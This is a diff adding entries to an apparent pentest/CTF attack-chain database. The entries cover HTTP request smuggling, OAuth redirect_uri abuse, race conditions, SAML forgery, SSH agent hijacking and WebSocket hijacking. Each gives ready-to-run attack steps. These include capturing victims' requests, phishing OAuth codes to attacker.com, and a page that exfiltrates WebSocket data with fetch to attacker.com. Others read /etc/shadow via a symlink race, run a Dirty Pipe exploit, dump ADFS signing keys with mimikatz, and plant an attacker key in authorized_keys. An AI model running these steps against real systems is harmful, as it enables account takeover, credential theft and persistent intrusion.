+        },
+        {
+          "id": "capture_victim_request",
+          "name": "Smuggle a prefix that captures the victim's request",
+          "inline_command": "# Send via Burp Repeater (raw, with Content-Length disabled in Repeater settings):\ncat <<'EOF' > smuggle.txt\nPOST / HTTP/1.1\nHost: <host>\nTransfer-Encoding: chunked\nContent-Length: 213\n\n0\n\nPOST /log HTTP/1.1\nHost: <host>\nCookie: x=\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 200\n\nx=\nEOF\n# The back-end parses the smuggled POST /log; it consumes 200 bytes\n# of the NEXT victim's actual request and stores them in your /log\n# form param. Hit /log/admin to retrieve the captured data.\n"
+        },
+        {
+          "id": "header_injection_via_smuggling",
+          "name": "Inject X-Forwarded-Host into victim's session",
+          "inline_command": "# Smuggle a request whose Host header attacker controls; if the\n# origin builds password-reset URLs from Host, the reset email\n# link points at attacker.com:\ncat <<'EOF' >> smuggle.txt\nGET /reset-password?email=victim@target.com HTTP/1.1\nHost: attacker.com\nEOF\n# → password-reset link in email: https://attacker.com/reset?token=...\n"
+        },
+        {
+          "id": "poison_cache_via_smuggling",
+          "name": "Combine with cache poisoning",
+          "inline_command": "# Smuggle a request that hits a cacheable static path with malicious\n# Host header → response keyed under /static/main.js with attacker content.\n# See chains/cache-deception-poisoning.yaml for the cache primitive.\necho 'Chain into cache-deception-poisoning for the cache abuse.'\n"
+        },
+        {
+          "id": "h2_smuggling",
+          "name": "HTTP/2 smuggling (modern hot variant)",
+          "inline_command": "# H2.CL: HTTP/2 strips Content-Length validation; back-end speaks HTTP/1.1\n# and trusts the smuggled CL.\n# H2.TE: same for Transfer-Encoding.\n# H2.0: HTTP/2 newline injection — :authority value contains \\r\\n that\n# introduces a header on the down-converted HTTP/1.1 request.\n# Burp Repeater → toggle \"send via HTTP/2\" → enter pseudo-header\n# values like:\n#   :authority: target.com\\r\\nFoo: bar\n",
+          "notes": "James Kettle's \"HTTP/2: The Sequel is Always Worse\" (Black Hat 2021)\ncatalogs every variant. Modern Burp builds in detection.\n"
+        },
+        {
+          "id": "confirm_and_weaponize",
+          "name": "Confirm desync → measure how much you can smuggle",
+          "inline_command": "# Differential test: send 2 versions of the same probe; one with\n# the smuggle padding, one without. Different response time / status\n# = confirmation.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — Request smuggling",
+          "url": "https://portswigger.net/web-security/request-smuggling"
+        },
+        {
+          "title": "James Kettle — H2 The Sequel Is Always Worse",
+          "url": "https://portswigger.net/research/http2"
+        },
+        {
+          "title": "Smashing the State Machine (race + smuggle hybrid)",
+          "url": "https://portswigger.net/research/smashing-the-state-machine"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "cache-deception-poisoning",
+          "when": "smuggling lands → poison cache for persistence",
+          "reason": "Combine for shared-cache backdoor that affects every user."
+        }
+      ]
+    },
+    {
       "id": "jwt-attacks",
       "name": "Web — JWT attacks (none / alg confusion / weak secret)",
       "description": "JSON Web Tokens are a CTF staple for auth bypass. The four common weaknesses: `alg:none` accepted, RS→HS algorithm confusion, weak HMAC secret crackable offline, kid header path traversal.\n",
@@ -4926,6 +5572,110 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "oauth-redirect-uri-abuse",
+      "name": "Web — OAuth redirect_uri / state abuse → account takeover",
+      "description": "OAuth 2.0 implementations commonly mis-validate `redirect_uri` (open redirect, subdomain wildcard, path-traversal) — attacker captures the authorization code / access token meant for the victim's account. Bonus: missing or static `state` enables full CSRF on the OAuth flow.\n",
+      "tags": [
+        "web",
+        "oauth",
+        "sso",
+        "redirect-uri",
+        "account-takeover"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "oauth_authorize_url",
+          "description": "Authorization endpoint (e.g. https://auth.target.com/oauth/authorize).",
+          "required": true
+        },
+        {
+          "name": "client_id",
+          "description": "Public client_id of the legitimate app.",
+          "required": true
+        },
+        {
+          "name": "legitimate_redirect_uri",
+          "description": "The redirect_uri the app normally uses.",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "enumerate_validations",
+          "name": "Probe redirect_uri validation rules",
+          "inline_command": "# Try each variant and check whether the IDP issues a code:\n# 1) Open redirect on the registered domain:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../attacker.com&state=x\"\n# 2) Subdomain bypass (if *.target.com is registered):\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.target.com&state=x\"\n# 3) Path traversal:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../../redirect?to=attacker.com&state=x\"\n# 4) URL encoded host:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https%3A%2F%2Fattacker.com&state=x\"\n# 5) @ trick:\ncurl -I \"<auth>?response_type=code&client_id=<cid>&redirect_uri=https://<legit-host>@attacker.com&state=x\"\n",
+          "inputs": {
+            "auth": "${oauth_authorize_url}",
+            "cid": "${client_id}",
+            "legit": "${legitimate_redirect_uri}"
+          },
+          "notes": "Any 302 to attacker.com (or any path containing the auth code)\nindicates a working bypass. Save the exact payload that worked.\n"
+        },
+        {
+          "id": "craft_full_phish",
+          "name": "Craft the phishing URL that captures the code",
+          "inline_command": "# Once you have a working redirect_uri bypass:\necho 'Send this URL to the victim:'\necho '<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.com/callback&state=x&scope=openid+profile+email'\n# On click → IDP grants code → redirects to attacker.com/callback?code=AUTHORIZATION_CODE\n",
+          "inputs": {
+            "auth": "${oauth_authorize_url}",
+            "cid": "${client_id}"
+          }
+        },
+        {
+          "id": "exchange_code",
+          "name": "Exchange captured code for an access token",
+          "inline_command": "curl -X POST '<token_endpoint>' \\\n  -d 'grant_type=authorization_code' \\\n  -d 'code=<CAPTURED_CODE>' \\\n  -d 'client_id=<cid>' \\\n  -d 'redirect_uri=https://attacker.com/callback'\n",
+          "inputs": {
+            "cid": "${client_id}"
+          },
+          "notes": "Public clients (PKCE) won't need a client_secret. Confidential clients\ndo — but you might not need to exchange at all; many apps use the\ncode itself as a session token in their callback path.\n",
+          "capture": [
+            {
+              "var": "oauth_access_token",
+              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
+              "match": "first"
+            }
+          ]
+        },
+        {
+          "id": "state_csrf",
+          "name": "If state is empty/static — CSRF the entire flow",
+          "inline_command": "# Build an HTML auto-submit form pointing at /oauth/callback?code=<your_code>:\ncat > csrf-oauth.html <<'EOF'\n<html><body onload=\"document.forms[0].submit()\">\n<form action=\"https://victim-app.com/oauth/callback\" method=\"GET\">\n  <input name=\"code\" value=\"ATTACKER_CODE\">\n  <input name=\"state\" value=\"\">\n</form>\n</body></html>\nEOF\n# Lure victim → their session ends up bound to YOUR account.\n",
+          "notes": "Same primitive used in account-merge attacks: log in as victim into\nattacker's account → linked → attacker now owns victim's data.\n"
+        },
+        {
+          "id": "use_token",
+          "name": "Use the access token against the API",
+          "inline_command": "curl 'https://api.target.com/me' \\\n  -H 'Authorization: Bearer <token>'\n",
+          "inputs": {
+            "token": "${oauth_access_token}"
+          }
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — OAuth",
+          "url": "https://portswigger.net/web-security/oauth"
+        },
+        {
+          "title": "HackTricks — OAuth",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "jwt-attacks",
+          "when": "token is a JWT",
+          "reason": "Inspect/forge the JWT once captured."
+        },
+        {
+          "chain": "csrf-and-token-leak",
+          "when": "state CSRF surfaces login flow weaknesses",
+          "reason": "Chain with broader CSRF for fuller takeover."
+        }
+      ]
+    },
+    {
       "id": "office-macro-initial-access",
       "name": "Phishing — Office macro initial access → C2 shell",
       "description": "Classic phishing chain. .docm with a VBA AutoOpen handler pulls down a PowerShell stager (or Cobalt Strike / Sliver / Mythic beacon) and runs in the user's context. Useful for red-team exercises and HTB \"Reel\" style boxes.\n",
@@ -5649,6 +6399,78 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "race-condition-toctou",
+      "name": "Web / Linux — race condition / TOCTOU exploitation",
+      "description": "Time-of-check / time-of-use bugs let you change a value between when the app validates it and when it acts on it. Two flavors: file-system TOCTOU (Linux privesc), and HTTP race-window (limit bypass, IDOR via parallel requests, double-spend).\n",
+      "tags": [
+        "race-condition",
+        "toctou",
+        "web",
+        "linux",
+        "priv-esc"
+      ],
+      "difficulty": "hard",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "identify_target",
+          "name": "Identify a TOCTOU candidate",
+          "inline_command": "echo 'File-system TOCTOU triggers:\n  - SUID binary that stats a path → opens it (symlink swap window)\n  - cron job: chown/chmod-ing files in /tmp or any writable dir\n  - umask 0/000 + race to write into a privileged dir before chmod\n  - PHP file_get_contents on a path the app then chmod-s 600\n\nHTTP race triggers:\n  - Coupon code redemption (apply same code N times in parallel)\n  - Withdraw funds (initiate N withdrawals before balance update)\n  - Email verification (re-use the token N times before invalidation)\n  - User signup (claim a reserved username via concurrent POSTs)\n  - 2FA enrollment (race the disable-2FA endpoint with re-add)'\n"
+        },
+        {
+          "id": "filesystem_toctou",
+          "name": "File-system TOCTOU: symlink swap during SUID validation",
+          "inline_command": "# Vulnerable SUID app at /usr/local/bin/vuln-app that:\n# 1) stats /tmp/in.txt — checks owned by current user\n# 2) opens it as root\n# → Race: between stat() and open(), swap a symlink.\n\ncat > /tmp/in.txt <<'EOF'\nlegitimate content\nEOF\n\n# Race loop:\nwhile true; do\n  ln -sf /tmp/in.txt /tmp/sym\ndone &\nLOOP1=$!\nwhile true; do\n  ln -sf /etc/shadow /tmp/sym\ndone &\nLOOP2=$!\n\n# In another shell:\nwhile true; do /usr/local/bin/vuln-app /tmp/sym; done\n\n# Kill the loops when you see /etc/shadow content:\nkill $LOOP1 $LOOP2\n"
+        },
+        {
+          "id": "dirty_pipe_cve_2022_0847",
+          "name": "Modern kernel TOCTOU — Dirty Pipe (CVE-2022-0847)",
+          "inline_command": "# Linux 5.8 - 5.16 — write to any read-only file via pipe splice.\n# Used to overwrite /etc/passwd root entry with attacker hash.\ngit clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits /tmp/dp\ngcc /tmp/dp/exploit-1.c -o /tmp/dp/exploit-1\n/tmp/dp/exploit-1 /usr/bin/su  # replaces su's setuid bytes → root via patched su\n"
+        },
+        {
+          "id": "http_race_with_turbo_intruder",
+          "name": "HTTP race — Burp Turbo Intruder (single-packet attack)",
+          "inline_command": "# In Burp → extension Turbo Intruder → load this script:\ncat > race.py <<'EOF'\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, engine=Engine.BURP2)\n    # Send 30 identical requests in a single HTTP/2 packet:\n    for i in range(30):\n        engine.queue(target.req)\ndef handleResponse(req, interesting):\n    table.add(req)\nEOF\n# Many \"limit once\" endpoints break under this single-packet attack:\n# all requests arrive within the same TCP segment, hit the DB before\n# the row-lock kicks in.\n"
+        },
+        {
+          "id": "http_race_with_h2",
+          "name": "HTTP/2 last-byte sync (most reliable race window)",
+          "inline_command": "# James Kettle's technique: queue 30 requests, hold the LAST byte\n# of each, then release them all at once with one TLS write.\n# Tools: Turbo Intruder (Burp), or Frans Rosén's \"race-the-web\".\npython3 -c '\nfrom race_the_web import single_packet_attack\nsingle_packet_attack(\n    url=\"https://target.com/redeem\",\n    method=\"POST\",\n    body={\"code\": \"PROMO25\"},\n    headers={\"Cookie\": \"session=...\"},\n    concurrent=30,\n)'\n"
+        },
+        {
+          "id": "account_takeover_via_race",
+          "name": "Famous race takeover: re-use email-verify token",
+          "inline_command": "# 1) Sign up with attacker@evil.com for username `admin`. Get verify token.\n# 2) Use the verify token N times in parallel — each request looks up\n#    the token, marks it used, sets your email. If the lookup happens\n#    before the prior update committed → you can race past `unique email`\n#    constraints and reuse the verify on a SECOND account claiming\n#    victim's email.\n# Tools: caido / Burp Turbo Intruder with the script above.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — Race conditions",
+          "url": "https://portswigger.net/web-security/race-conditions"
+        },
+        {
+          "title": "Single-packet attack (James Kettle)",
+          "url": "https://portswigger.net/research/smashing-the-state-machine"
+        },
+        {
+          "title": "Dirty Pipe (CVE-2022-0847)",
+          "url": "https://dirtypipe.cm4all.com/"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "shell-stabilization",
+          "when": "kernel race popped a root shell",
+          "reason": "Stabilize the new root shell."
+        },
+        {
+          "chain": "linux-priv-esc-recon",
+          "when": "gained root via TOCTOU",
+          "reason": "Loot the box."
+        }
+      ]
+    },
+    {
       "id": "rbcd-takeover",
       "name": "AD — RBCD (Resource-Based Constrained Delegation) takeover",
       "description": "When you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (or you own a computer account thanks to MachineAccountQuota>0), you can have your controlled machine S4U2self/S4U2proxy onto the target as anyone — including SYSTEM via the CIFS service.\n",
@@ -5777,6 +6599,89 @@ const CHAIN_DATA = {
           "chain": "ad-persistence-golden-ticket",
           "when": "target was DC",
           "reason": "Take a Golden Ticket out before cleanup."
+        }
+      ]
+    },
+    {
+      "id": "saml-attacks",
+      "name": "Web — SAML attacks (XSW signature wrapping, golden SAML)",
+      "description": "SAML's XML-DSig signature is famously brittle. XSW lets you splice a forged assertion into a legitimately-signed envelope. With access to the IDP's signing key, Golden SAML mints arbitrary assertions = silent enterprise-wide AD FS / Okta / OneLogin takeover.\n",
+      "tags": [
+        "web",
+        "saml",
+        "sso",
+        "xsw",
+        "golden-saml",
+        "account-takeover"
+      ],
+      "difficulty": "hard",
+      "inputs": [
+        {
+          "name": "target_sp",
+          "description": "SAML SP endpoint (ACS / Assertion Consumer Service URL).",
+          "required": true
+        },
+        {
+          "name": "sample_saml_response",
+          "description": "A valid SAMLResponse intercepted in transit (Burp / browser dev tools)."
+        }
+      ],
+      "steps": [
+        {
+          "id": "decode_response",
+          "name": "Decode the SAML Response",
+          "inline_command": "# SAMLResponse is base64 + URL-encoded form field.\necho '<saml_response>' | python3 -c 'import sys, base64, urllib.parse; print(base64.b64decode(urllib.parse.unquote(sys.stdin.read())).decode())'\n",
+          "inputs": {
+            "saml_response": "${sample_saml_response}"
+          },
+          "notes": "Look at: <Subject>, <Conditions> (NotBefore/NotOnOrAfter), <Audience>,\n<AttributeStatement> (roles/groups). The Signature block tells you\nwhich element is signed — XSW exploits the fact that the SP might\nvalidate one element and process another.\n"
+        },
+        {
+          "id": "xsw_with_samlraider",
+          "name": "Auto-run XSW attacks with SAML Raider (Burp plugin)",
+          "inline_command": "echo 'In Burp: select the SAMLResponse → SAML Raider tab → Attacks → run XSW1 through XSW8. Forward to SP, watch for an accepted forgery (different Subject, same signature).'",
+          "notes": "8 canonical XSW variants. The SP's XML parser + signature validator\nmismatch is what each one targets — if your SP uses a popular library\n(Spring Security SAML, Shibboleth, etc.), at least one usually lands.\n"
+        },
+        {
+          "id": "comment_injection_xsw",
+          "name": "XSW via XML comment injection (Microsoft Active Login)",
+          "inline_command": "# Trick: inject an XML comment inside the username attribute.\n# Signed canonical form sees \"admin@target.com<!--x-->\" as one string,\n# but the SP's XPath extraction stops at the comment → reads \"admin\".\nsed 's/<NameID>victim/<NameID>admin<!--/' original.xml | sed 's/victim<\\/NameID>/--><\\/NameID>/'\n",
+          "notes": "Famous Duo / OneLogin / Shibboleth / Centrify bug from 2018. Worth\ntrying any time you control the username field of an existing assertion.\n"
+        },
+        {
+          "id": "idp_initiated_replay",
+          "name": "IDP-initiated replay (Conditions missing? Re-use assertions)",
+          "inline_command": "# If NotOnOrAfter is unset or set far in the future + no replay-detection\n# (nonce check), the same SAMLResponse logs you in repeatedly.\ncurl -X POST '<sp>' -d \"SAMLResponse=<original_response_b64>&RelayState=/\"\n",
+          "inputs": {
+            "sp": "${target_sp}"
+          }
+        },
+        {
+          "id": "golden_saml",
+          "name": "Golden SAML (post-compromise IDP key extraction)",
+          "inline_command": "# 1) On the IDP server (ADFS): dump the token signing cert + private key.\nGet-AdfsCertificate\nmimikatz \"lsadump::trust /patch\"\n# 2) Generate arbitrary SAMLResponse signed by that key:\npython3 -c '\nfrom saml2 import config, server, response, saml, samlp\n# Build assertion as the desired user, sign with stolen key, post to SP.'\n",
+          "notes": "Requires DA on the IDP server. Once you have the key, you can mint\nassertions for ANYONE indefinitely — survives password resets,\nMFA enrollment, even account deletion. The ultimate persistence\nagainst SSO-dependent infrastructure.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — SAML",
+          "url": "https://portswigger.net/web-security/saml"
+        },
+        {
+          "title": "Golden SAML (CyberArk)",
+          "url": "https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps"
+        },
+        {
+          "title": "SAML Raider",
+          "url": "https://github.com/CompassSecurity/SAMLRaider"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "ad-persistence-golden-ticket",
+          "when": "Golden SAML succeeded — also have DA on the IDP host",
+          "reason": "Layer Golden Ticket + Golden SAML for dual-domain + cloud persistence."
         }
       ]
     },
@@ -6269,6 +7174,82 @@ const CHAIN_DATA = {
       ]
     },
     {
+      "id": "ssh-agent-forwarding-abuse",
+      "name": "Lateral — SSH agent forwarding abuse (hijack the socket)",
+      "description": "A logged-in admin used `ssh -A` to reach your compromised box → their agent socket is in /tmp. Reuse it to authenticate as them to any other host their keys reach. No password, no key file, full transparency.\n",
+      "tags": [
+        "lateral-movement",
+        "ssh",
+        "agent-forwarding",
+        "post-exploitation",
+        "linux"
+      ],
+      "difficulty": "easy",
+      "inputs": [],
+      "steps": [
+        {
+          "id": "find_agent_sockets",
+          "name": "Find every accessible ssh-agent socket",
+          "inline_command": "ls -la /tmp/ssh-* 2>/dev/null\nls -la /tmp/.ssh-* 2>/dev/null\n# Sometimes in user home / runtime dir:\nfind /tmp /run /var/run -name 'agent.*' -o -name 'ssh-agent.*' 2>/dev/null\n# Per-process via /proc:\nfor pid in $(pgrep -f 'ssh.*-A'); do\n  cat /proc/$pid/environ 2>/dev/null | tr '\\0' '\\n' | grep SSH_AUTH_SOCK\ndone\n",
+          "capture": [
+            {
+              "var": "agent_sockets",
+              "regex": "^(/tmp/ssh-[A-Za-z0-9]+/agent\\.\\d+)$",
+              "match": "all"
+            }
+          ]
+        },
+        {
+          "id": "hijack_socket",
+          "name": "Hijack the agent socket and list keys",
+          "inline_command": "export SSH_AUTH_SOCK=<socket_path>\nssh-add -L\n",
+          "notes": "Output shows every key the agent holds (public + comment). If the\nuser has DA SSH keys / cloud bastion keys cached, they're yours.\nNo password prompt — the agent signs requests automatically.\n"
+        },
+        {
+          "id": "enumerate_known_hosts",
+          "name": "Find where these keys might work",
+          "inline_command": "# Their known_hosts file (yours if they ran ssh from this box):\ncat /home/*/known_hosts 2>/dev/null\ncat /home/*/.ssh/known_hosts 2>/dev/null\n# Their SSH config — aliases & bastions:\ncat /home/*/.ssh/config 2>/dev/null\n"
+        },
+        {
+          "id": "ssh_with_their_identity",
+          "name": "SSH to a target using the hijacked agent",
+          "inline_command": "export SSH_AUTH_SOCK=<socket_path>\nssh -A admin@bastion.internal\n# Once on bastion, continue chaining — the forwarding follows you.\n# If you can write to their .ssh/authorized_keys, drop YOUR key for\n# persistence:\ncat >> /home/<user>/.ssh/authorized_keys <<< 'ssh-ed25519 AAAA... attacker@evil'\n"
+        },
+        {
+          "id": "persist_via_hidden_listener",
+          "name": "Persist: leave a process that re-binds the socket later",
+          "inline_command": "# When the admin's session ends, agent socket disappears. Snapshot\n# the keys NOW (you have to actually use them; the agent never gives\n# up raw key material). Use them to:\n# - Add your own key to authorized_keys on every reachable host\n# - Schedule a cron job that runs as you\n# - Drop an SSH ControlMaster persistent socket\n"
+        },
+        {
+          "id": "agent_request_forwarding",
+          "name": "Sign any blob using the agent (creative use)",
+          "inline_command": "# ssh-agent will sign anything the protocol lets you send. SCP\n# uses an SSH session — but you can also abuse:\n# - git over SSH (push to GitHub as the admin)\n# - rsync over SSH (sync remote into your bucket)\n# - SFTP (download every file from servers reachable by their key)\nexport SSH_AUTH_SOCK=<socket_path>\ngit -c user.email='admin@target.com' clone git@github.com:org/internal-repo /tmp/loot\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — SSH socket hijack",
+          "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ssh-agent-socket-hijack"
+        },
+        {
+          "title": "OpenSSH agent forwarding caveats",
+          "url": "https://man.openbsd.org/ssh#A"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "pivoting-chisel-ligolo",
+          "when": "reached an internal-network bastion",
+          "reason": "Tunnel back out to attack the internal subnet directly."
+        },
+        {
+          "chain": "nmap-recon",
+          "when": "now on a new host",
+          "reason": "Repeat recon from the new vantage point."
+        }
+      ]
+    },
+    {
       "id": "ssti-to-rce",
       "name": "Web → Shell — Server-Side Template Injection (Jinja2 / Twig / FreeMarker)",
       "description": "Fingerprint the template engine, find a sandbox bypass, hit RCE. The classic 7×7 / ${{7*7}} test tells you which engine you're hitting, and the chosen-engine sandbox bypass gives you shell.\n",
@@ -6648,6 +7629,85 @@ const CHAIN_DATA = {
         {
           "chain": "dpapi-secrets-extraction",
           "reason": "SYSTEM shell — loot the box."
+        }
+      ]
+    },
+    {
+      "id": "websocket-origin-bypass",
+      "name": "Web — WebSocket cross-site hijacking (CSWSH) + origin bypass",
+      "description": "WebSockets aren't subject to CORS — only the `Origin` header is checked (if at all). If the server doesn't enforce origin OR uses a permissive check, attacker site can open a WS connection riding the victim's cookies → bidirectional access to their authenticated session.\n",
+      "tags": [
+        "web",
+        "websocket",
+        "cswsh",
+        "origin-bypass",
+        "csrf"
+      ],
+      "difficulty": "medium",
+      "inputs": [
+        {
+          "name": "ws_endpoint",
+          "description": "WebSocket URL (wss://target.com/ws).",
+          "required": true
+        }
+      ],
+      "steps": [
+        {
+          "id": "identify_ws",
+          "name": "Identify WebSocket endpoints",
+          "inline_command": "# In Burp/dev tools, watch for \"ws://\" or \"wss://\" connections.\n# Open the WS in browser dev tools → look at Frames tab to see message\n# shape (often JSON-RPC-like: {\"id\":1,\"method\":\"...\",\"params\":...}).\n# Also check JS source:\ncurl -s '<app>' | grep -oE 'wss?://[^\"]+'\n"
+        },
+        {
+          "id": "origin_check_probe",
+          "name": "Test Origin header enforcement",
+          "inline_command": "# 1) Confirm normal connect works:\nwebsocat '<ws>' --header 'Origin: https://target.com' --header 'Cookie: session=<victim_cookie>'\n# 2) Try with attacker origin:\nwebsocat '<ws>' --header 'Origin: https://attacker.com' --header 'Cookie: session=<victim_cookie>'\n# 3) Try with no Origin (curl behavior):\nwebsocat '<ws>' --header 'Cookie: session=<victim_cookie>'\n",
+          "inputs": {
+            "ws": "${ws_endpoint}"
+          },
+          "notes": "If #2 or #3 still receives messages — CSWSH viable. If only #1 works\n→ origin is enforced; look for less-strict variants (null origin,\nsubdomain prefix/suffix bypasses).\n"
+        },
+        {
+          "id": "craft_attack_page",
+          "name": "Craft attacker-hosted page that hijacks WS",
+          "inline_command": "cat > attack.html <<'EOF'\n<html><body>\n<script>\n  const ws = new WebSocket('<ws>');\n  ws.onopen = () => {\n    // Send any message the legit client would send:\n    ws.send(JSON.stringify({id:1, method:'getProfile'}));\n  };\n  ws.onmessage = (e) => {\n    // Exfil to attacker:\n    fetch('https://attacker.com/log?d=' + btoa(e.data));\n  };\n</script>\n</body></html>\nEOF\n# Host: python3 -m http.server 80\n# Lure victim to it while they're logged in to <ws_host>.\n",
+          "inputs": {
+            "ws": "${ws_endpoint}"
+          }
+        },
+        {
+          "id": "bypass_subdomain",
+          "name": "Subdomain bypass: 'https://target.com' substring matching",
+          "inline_command": "# If server checks Origin with startsWith('https://target.com') —\n# any URL starting with that string passes:\n#   https://target.com.attacker.com  →  passes the check\nwebsocat '<ws>' --header 'Origin: https://target.com.attacker.com' --header 'Cookie: session=<cookie>'\n",
+          "inputs": {
+            "ws": "${ws_endpoint}"
+          }
+        },
+        {
+          "id": "token_in_url_leak",
+          "name": "If WS auth is via URL token (?token=...) → Referer leak",
+          "inline_command": "# Many apps put bearer tokens in the WS URL itself; the URL ends up\n# in window.location and leaks via Referer to any image/script on\n# third-party domains.\n# Bonus: WS upgrade fetch is GET — server logs the full URL with token.\n"
+        },
+        {
+          "id": "full_takeover",
+          "name": "Bidirectional control → take over the session",
+          "inline_command": "# From inside your attack.html, send the WS messages that:\n# - retrieve the victim's profile\n# - change their email\n# - trigger a password reset to attacker@evil.com\n# All of it rides the WS auth — same as logged-in user.\n"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger — WebSocket security",
+          "url": "https://portswigger.net/web-security/websockets"
+        },
+        {
+          "title": "HackTricks — WebSocket Attacks",
+          "url": "https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html"
+        }
+      ],
+      "next_chains": [
+        {
+          "chain": "csrf-and-token-leak",
+          "when": "WS used for state-changing actions",
+          "reason": "CSWSH is a CSRF variant — chain into broader CSRF audit."
         }
       ]
     },
